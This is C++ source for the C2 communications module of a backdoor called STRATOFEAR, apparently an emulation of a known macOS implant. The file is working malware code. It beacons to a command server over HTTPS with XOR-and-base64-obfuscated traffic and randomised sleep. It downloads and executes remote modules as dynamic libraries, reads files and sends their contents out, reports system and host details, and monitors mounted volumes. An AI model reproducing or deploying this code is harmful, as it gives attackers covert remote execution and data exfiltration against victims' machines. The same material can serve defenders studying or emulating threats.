#include "staticcert.hpp"
#include "comms.hpp"
#include "XorLogger.hpp"

char* environmentVariables;

namespace Communication {
    namespace HTTPS {

        /*
        Standard for this function
        https://curl.se/libcurl/c/CURLOPT_WRITEFUNCTION.html
        Renamed variable names for readability 
        */ 
        static size_t _WriteCallback(void *contents, size_t size, size_t count, void *stream){
            ((std::string*)stream)->append((char*)contents, size * count);
            return size * count;
        }

        // Takes plain text provided and returns an XOR then an encoded string
        std::string convertString_XOR_Enc(std::string input){
            std::string output;
            std::string XORString;
            XORString = Communication::XorCryptToString(input);
            output = base64_encode_string(XORString);
            return output;
        }

        // Builds the url based on the command passed
        std::string BuildRoute(Configuration stratofearConfig, std::string command){
            std::string url = "";
            std::string combinedUUID(stratofearConfig.UUID, 3);
            combinedUUID.append(stratofearConfig.version, 2);
            // Handles registration url
            if (!stratofearConfig.registered) {
                url = "https://" + stratofearConfig.domain + Communication::REGISTER_ROUTE;
                return url;
            }else{
                url = "https://" + stratofearConfig.domain + Communication::TASK_ROUTE + combinedUUID;
                return url;
            }
            return url;
        }

        // Builds the post body
        std::string BuildBody(Configuration stratofearConfig, std::string command, std::string filename, std::string data){
            std::string body = "";
            std::string combinedUUID(stratofearConfig.UUID, 3);
            combinedUUID.append(stratofearConfig.version, 2);
            std::string XORString;
            std::string result;

            if (!stratofearConfig.registered) {
                return convertString_XOR_Enc(combinedUUID);
            }
            if (command == Communication::HEARTBEAT_ID){
                return body;
            }
            if (command == Communication::RETRIEVE_MODULE_RESULT){
                
                // Load the file into memory using the path
                char* filepathPtr = getenv(filename.c_str());
                if (filepathPtr == nullptr) {
                    result = "Environment variable not found.";
                    return convertString_XOR_Enc(result);
                }

                std::ifstream file(filepathPtr, std::ios::binary);
                if (!file.is_open()) {
                    result = "Failed to open file.";
                    return convertString_XOR_Enc(result);
                }

                std::string file_contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                std::string encodedFile = base64_encode_string(file_contents);
                file.close();
                std::string tmpFilename = generateFilename();
                nlohmann::json body;
                body["id"] = RETRIEVE_MODULE_RESULT;
                body["moduleName"] = filename + "-" + tmpFilename;
                body["moduleBytes"] = encodedFile;
                result = body.dump();
                return convertString_XOR_Enc(result);
            }
            if (command == Communication::RETRIEVE_HOST_INFO){
                if (data != ""){
                    return convertString_XOR_Enc(data);
                }
                return convertString_XOR_Enc("Unable to collect discovery info");
            }
            return body;
        }

        Response SendHTTPSRequest(std::string type, Configuration stratofearConfig, std::string command, std::string filename, std::string data){
            Response response;            
            CURL *curl;
            CURLcode res;
            std::string response_data;
            std::string logString;

            // Build the route based on the command and config values
            std::string url = BuildRoute(stratofearConfig, command);
            if (url == ""){
                XorLogger::LogError("Command not recognized, failed to build URL");
                return response;
            }

            // Build the payload based on command and config values
            std::string body = BuildBody(stratofearConfig, command, filename, data);

            //Perform curl request based on type
            curl_global_init(CURL_GLOBAL_ALL);
            curl = curl_easy_init();
            if(curl) {
                curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

                // Add in PEM blob for curl
                struct curl_blob blob;
                blob.data = pem;
                blob.len = pem_len;
                blob.flags = CURL_BLOB_COPY;
                curl_easy_setopt(curl, CURLOPT_CAINFO_BLOB, &blob);
                
                // SSL Configuration
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);

                // Use the type parameter to perform the type of HTTPS request
                if (type == "GET"){
                    // Specify a get request
                    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
                }
                if (type == "POST"){
                    // Specify a get request
                    curl_easy_setopt(curl, CURLOPT_POST, 1L);
                    // Handle JSON data
                    struct curl_slist *headers = NULL;
                    headers = curl_slist_append(headers, "Content-Type: application/json");
                    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
                }
                // Capture the response from the server
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
                //Perform the configured curl request
                res = curl_easy_perform(curl);
                if (res != CURLE_OK) {
                    logString = curl_easy_strerror(res);
                    XorLogger::LogError("Curl failed " + logString);
                } else {
                    response.body = response_data;
                }
                curl_easy_cleanup(curl);
            }
            curl_global_cleanup();
            return response;
        }

        Response _CheckGetResponse(Response serverResponse, bool is_file) {
            if (serverResponse.body.empty()) {
                XorLogger::LogError("No data received from C2");
                return serverResponse;
            }
            try {
                // Handle the response from the C2
                serverResponse = Communication::HTTPS::ParseHTTPSResponse(serverResponse, is_file);
            }
            catch (std::exception e) {
                XorLogger::LogError("Response parsing error: " + std::string{ e.what() });
            }
            return serverResponse;
        }

        // Function that parses JSON and throws a JSONParsingError if parsing fails
        bool _verifyJSON(std::string jsonString) {
            try{
                nlohmann::json parsed_response = nlohmann::json::parse(jsonString);
                return true;
            } catch (nlohmann::json::parse_error e) {
                XorLogger::LogError("Failed to parse JSON.\nException: " + std::string{ e.what() } + "\nServer Response: " + jsonString);
                return false;
            }
        }

        Response ParseHTTPSResponse(Response serverResponse, bool is_file) {
            // Account for empty responses
            if (serverResponse.body == ""){
                serverResponse.command = "";
                return serverResponse;
            }

            // Decode & XOR the response
            std::string decoded_string = base64_decode_string(serverResponse.body);
            std::string deciphered_string = Communication::XorCryptToString(decoded_string);

            // Ensure JSON response and properly formatted 
            bool is_json = _verifyJSON(deciphered_string);

            // If JSON continue parsing 
            if (is_json){
                nlohmann::json parsed_response = nlohmann::json::parse(deciphered_string);
                serverResponse.command = parsed_response["id"];
                if (serverResponse.command == LOAD_MODULE_ID){
                    std::string encoded_bytes = std::string(parsed_response["moduleBytes"]);
                    serverResponse.moduleBytes = base64_decode(encoded_bytes);
                }
            }
            return serverResponse;
        }

        // C2 response handler
        void _HandleC2Response(Response response, Configuration stratofearConfig) {
            if(response.command == Communication::HEARTBEAT_ID){
                XorLogger::LogDebug("Heartbeat tasking received: " + response.command);
            return;
            }
            if(response.command == Communication::LOAD_MODULE_ID){
                XorLogger::LogDebug("Loading and executing Module: " + response.command);
                std::string filepath = createModuleFile(response.moduleBytes);
                
                // Load & execute dynamic library
                environmentVariables = executeModule(filepath);
                if(environmentVariables == nullptr){
                    XorLogger::LogError("Failed to execute module");
                }
                std::string result_str(environmentVariables);
                XorLogger::LogSuccess("Response from module: " + result_str);
                return;
            }
            if(response.command == Communication::RETRIEVE_MODULE_RESULT){

                if(environmentVariables == nullptr){
                    XorLogger::LogError("No environment variables available");
                    return;
                }
                char* envVarValue;
                char* envVar = std::strtok(environmentVariables, " ");
                while (envVar != nullptr) {
                    std::string envString(envVar);
                    XorLogger::LogDebug("Sending Post response to C2 containing environment variable: " + envString);
                    SendHTTPSRequest("POST", stratofearConfig, Communication::RETRIEVE_MODULE_RESULT, envString, "");
                    envVar = std::strtok(nullptr, " ");
                }
                return;
            }
            if(response.command == Communication::RETRIEVE_HOST_INFO){
                XorLogger::LogDebug("Sending Post response to C2 containing Host information: " + response.command);
                std::string result = collectSystemInfo();

                result += "STRATOFEAR Configuration Path: " + CONFIG_PATH + CONFIG_FILENAME + "\n";
                std::string uuid(stratofearConfig.UUID);
                std::string version(stratofearConfig.version);
                result += "UUID: " + uuid + "\n";
                result += "Version: " + version + "\n";
                result += "Domain: " + stratofearConfig.domain + "\n";

                SendHTTPSRequest("POST", stratofearConfig, Communication::RETRIEVE_HOST_INFO, "", result);
                return;
            }
            if(response.command == Communication::MONITOR_DEVICE_MOUNT){
                XorLogger::LogDebug("Monitoring Device Mounts: " + response.command);
                std::thread monitorThread(monitorDevices, "/Volumes");
                monitorThread.detach();
                return;
            }
            XorLogger::LogDebug("Unknown Command Received: " + response.command);   
        }
    }

    // Communication Class Functions

    // Sleep randomly between MIN_SLEEP_MS and MAX_SLEEP_MS
    void _Sleep() {
        int sleep = 0;
        time_t randSeed = time(0LL);
        srand(randSeed);

        sleep = rand()%(Communication::MAX_SLEEP_MS - Communication::MIN_SLEEP_MS + 1) + Communication::MIN_SLEEP_MS;
        XorLogger::LogDebug("Sleeping for " + std::to_string(sleep/1000) + " seconds");
        std::this_thread::sleep_for(std::chrono::milliseconds(sleep));
    }

    // C2 Communications loop
    void C2CommsLoop(Configuration stratofearConfig) {
        Communication::HTTPS::Response response;

        // Register with the C2
        if (!stratofearConfig.registered && stratofearConfig.configured) {
            response = Communication::HTTPS::SendHTTPSRequest("POST", stratofearConfig, Communication::HEARTBEAT_ID, "", "");
            response = _CheckGetResponse(response, false);
            stratofearConfig.registered = true;
        }

        // Check registration
        if (!stratofearConfig.registered) {
            XorLogger::LogError("Error response from C2 on registration, exiting comms loop.");
            return;
        }

        // Heartbeat loop with C2
        while (true) {
            response = Communication::HTTPS::SendHTTPSRequest("GET", stratofearConfig, Communication::HEARTBEAT_ID, "", "");
            response = _CheckGetResponse(response, false);
            if (response.body.empty()) {
                XorLogger::LogWarning("Empty server response from heartbeat");
            } else {
                _HandleC2Response(response, stratofearConfig);
            }
            _Sleep();
        }
        return;
    }

    std::string XorCryptToString(std::string input) {
        unsigned char key = 'k';
        std::string output;

        for (int i = 0; i < input.size(); i++){
            output += input[i] ^ key;
        }
        return output;
    }
}